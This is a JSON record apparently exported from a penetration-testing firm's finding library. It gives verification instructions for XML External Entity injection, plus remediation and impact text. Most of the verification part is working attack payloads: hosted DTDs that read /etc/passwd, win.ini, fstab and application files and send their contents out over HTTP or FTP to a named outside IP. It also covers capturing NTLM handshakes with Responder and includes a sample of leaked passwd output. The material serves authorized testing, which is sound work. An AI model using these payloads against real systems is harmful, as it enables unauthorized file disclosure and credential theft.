{"default_url":null,"content":{"state":0,"taskInstructions":null,"references":[],"isTaskInstructionsVisible":true,"isCommentMandatory":false,"fields":[],"masterFinding":{"id":5050649,"exploitInstructions":"","verificationInstructions":"<b>Verification Instructions</b>\n\nAttempt to inject DOCTYPE definitions to XML-based requests (SOAP or RESTful). DOCTYPE must be defined before the XML body. Reference to external entity: &amp;entity;\n\nXXE can also be found in XML formatted GET and POST parameters and the same instructions can be followed to identify XXE. XXE is quite common in SAML tokens.\n\nSample: \n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY\ntest SYSTEM \"http://www.test.com/test.txt\"&gt;&lt;!ELEMENT foo ANY&gt;]&gt;\n\n&lt;xml start&gt;\n..\n&lt;foo&gt;&amp;test;&lt;/foo&gt;\n..\n&lt;xml ends&gt;\n\nIt is not necessary to define the element, external entity references can be used within existing elements.\n\nIf injection possible, attempt to\n<ul><li>Read local files (entity reference file:///etc/passwd or c:\\windows\\win.ini)</li>\n<li>Attempt to connect back to the pentest lab environment and capture possible NTLM handshake with responder (entity reference http://&lt;pentestExternalIP&gt;/test or \\\\&lt;pentestExternalIP&gt;\\test on Windows systems)</li>\n</ul>\nIf outbound connectivity, external DTD can be hosted at the pentest lab.\n\nSample entity injection:\n\n&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n &lt;!DOCTYPE foo SYSTEM \"http://&lt;pentestExternalIP&gt;/test.dtd\"&gt;]&gt;\n\nHosted test.dtd file content:\n\n&lt;!ENTITY % payload SYSTEM \"file:///etc/passwd\"&gt;\n&lt;!ENTITY % param1 '&lt;!ENTITY &amp;&#35;37; external SYSTEM\n\"http://&lt;pentestExternalIP&gt;/x=&#35;%payload;\"&gt;'&gt; %param1; %external;\n\nInvalid URL (x=&#35;) is used to force error messages on SAX parser. It may not be necessary. Instead, file contents may be available on .216 in Apache access logs. % is used to create parameter entities; they are used inside DOCTYPE definition rather than the XML body.\n\nEntity injection has limited file read capabilities. XML tags and ampersands in files to be read break XML parsing and thus cannot typically be read. It may be possible to read XML files if a) outbound connectivity and b) reflection point for file read is found. I have no instructions at the moment... experiment.\n\n<b>Reporting Requirements</b>\n<ol><li>Add a screenshot of the original request</li>\n<li>Show the XXE injected to the request</li>\n<li>Show file content enumeration or external connection to pentest lab system</li>\n</ol>\n<b>Further Testing</b>\n\nTest for additional findings that can be identified via XXE injection:\n<ul><li>Insufficient Egress Filtering - report if HTTP or SMB connectivity to pentest lab servers (or Collaborator)</li>\n<li>Cleartext passwords in files - report if file include used to gain access to cleartext credentials</li>\n<li>Excessive Privileges - Service Account - report on Windows if possible to connect to \\\\localhost\\c$\\windows\\win.ini</li>\n</ul>\n\n<b>ADDITIONAL INSTRUCTIONS</b>\n\n<b><u>ERROR Based Injection using DTD</u></b>\n\n\n<b><i>Verification Summary</i></b>\n\n1. Add firewall exception for the client's IPs.\n2. Inject external DTD reference that points to pentest lab servers/files.\n4. Sniff incoming traffic and parse Apache logs.\n\n\n<b><i>Firewall Exception Details</i></b>\n\nThe first thing you'll need to do is add an exception on the data exfiltration firewall for the client outbound IPs.  To do that follow the basic instructions below.\n\n1. Log into the pentest firewall location \n\n2. Start monitoring traffic to look for incoming traffic.\n\nDiagnostics -&gt; Packet Capture\n\n3. Initiate the XML injection.\n\n4. Stop and review the IPs from the capture, identify the client IP, and add the IP addresses to the pentest alias.\n\nFirewall -&gt; Aliases -&gt; Edit -&gt; + button -&gt; Add IP and Comment -&gt;Press Save -&gt; Press Apply Changes\n\n\n<b><u>Inject External DTD Reference</u></b>\n\n<b><i>Below is an example request</i></b>\n\nPOST /test HTTP/1.1\nHost: someserver.test.com\nAccept: application/json\nContent-Type: application/xml\nContent-Length: 137\n \n&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;\n&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/stest.dtd\"&gt;\n&lt;root&gt;\n&lt;search&gt;name&lt;/search&gt;\n&lt;/root&gt;\n\n<b><i>Expected result example:</i></b>\n\nHTTP/1.1 500 Internal Server Error\nContent-Type: application/xml\nContent-Length: 2467\n \n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;root&gt;\n&lt;errors&gt;\n&lt;errorMessage&gt;java.io.FileNotFoundException: file:///nothere/root:x:0:0:root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync...\n\n\n<b><i>Below are different files that are currently on the netspi web server.</i></b>\n\n&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi.dtd\"&gt;\n\ncontent:\n\n&lt;!ENTITY % payload SYSTEM \"file:///var/log/messages\"&gt;\n&lt;!ENTITY % param1 \"&lt;!ENTITY &amp;&#35;37; external SYSTEM 'http://209.118.108.216/x=&#35;%payload;'&gt;\"&gt;%param1;%external;\n\n\n&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi2.dtd\"&gt;\n\ncontent:\n\n&lt;!ENTITY % payload SYSTEM \"file:///etc/passwd\"&gt;\n&lt;!ENTITY % param1 \"&lt;!ENTITY &amp;&#35;37; external SYSTEM 'ftp://%payload;:aaa@209.118.108.216:443'&gt;\"&gt;%param1;%external;\n\n\n&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi3.dtd\"&gt;\n\ncontent:\n\n&lt;!ENTITY % b SYSTEM \"file:///etc/passwd\"&gt;\n&lt;!ENTITY % c \"&lt;!ENTITY &amp;&#35;37; rrr SYSTEM 'ftp://209.118.108.216:443/%b;'&gt;\"&gt;\n\n\n&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi4.dtd\"&gt;\n\ncontent:\n\n&lt;!DOCTYPE drawing SYSTEM \"http://209.118.108.216/netspi.dtd\"&gt;\n&lt;!ENTITY payload \"file://c:\\windows\\win.ini\"&gt; \n\n\n&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi5.dtd\"&gt;\n\ncontent:\n\n&lt;!ENTITY % payload SYSTEM \"file:///etc/fstab\"&gt;\n&lt;!ENTITY % param1 \"&lt;!ENTITY &amp;&#35;37; external SYSTEM 'http://209.118.108.216/x=&#35;%payload;'&gt;\"&gt;%param1;%external;\n\n\n&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi6.dtd\"&gt;\n\ncontent:\n\n&lt;!ENTITY % payload SYSTEM \"file:///Program Files/Business Objects/manifest.db\"&gt;\n&lt;!ENTITY % param1 \"&lt;!ENTITY &amp;&#35;37; external SYSTEM 'ftp://209.118.108.216:443/%payload;'&gt;\"&gt;%param1;%external;\n\n\n&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi7.dtd\"&gt;\n\ncontent:\n\n&lt;!ENTITY % payload SYSTEM \"file:///Documents and Settings/\"&gt;\n&lt;!ENTITY % end \"]]&gt;\"&gt;\n&lt;!ENTITY % param1 \"&lt;!ENTITY &amp;&#35;37; external SYSTEM 'file:///test/%payload;'&gt;\"&gt;%param1;%external;\n\nCDATA:\n\nInjection (With inflection point):\n\n&lt;!DOCTYPE updateProfile [\n &lt;!ENTITY % file SYSTEM \"file:///test\"&gt;\n &lt;!ENTITY % start \"&lt;![CDATA[\"&gt;\n &lt;!ENTITY % end \"]]&gt;\"&gt;\n &lt;!ENTITY % dtd SYSTEM \"http://209.118.108.216/cdata.dtd\"&gt;\n%dtd;\n]&gt;\n\nOn NetSPI server:\n\n&lt;!ENTITY all \"%start;%file;%end;\"&gt;\n\n\n<b><i>Monitoring incoming traffic</i></b>\n\n1. Login into 10.2.4.11 via ssh as root or login via the vsphere client.\n2. Montor incoming request via the Apache log with the command below.\n\ntail -f /var/log/apache2/httpd-access.log\n","remediationInstructions":"Consider all XML input as untrusted, and thus prohibit all external entity references and inline DOCTYPE definitions.\n","name":"XML External Entity Injection","sourceId":"M:392f499a-411d-e211-b92d-001e4f120032","severity":"High","businessImpact":"Successful exploitation of the vulnerability may allow an unauthorized user to read arbitrary files on the affected system, resulting in the compromise of confidentiality. Exploitation may lead to disclosure of confidential information, as well as reveal sensitive information that can be used in further attacks against the target system.","description":"External Entities and external document type definitions allow referencing resources outside the main file into an XML document. When an XML processor recognizes a reference to an external entity to validate the document, it may include the entity's replacement text.  Attacks targeting this behavior are commonly referred to as XML External Entity (XXE) attacks.\n\nAn attacker could, by including user-controlled external entity in the XML request:\n<ul><li>Force the XML processor to read arbitrary files on the remote system</li>\n<li>Force the XML processor to connect to external systems</li>\n<li>Craft a malicious XML bomb with nested entities to consume server's resources, causing Denial of Service conditions</li>\n</ul>\n"}}}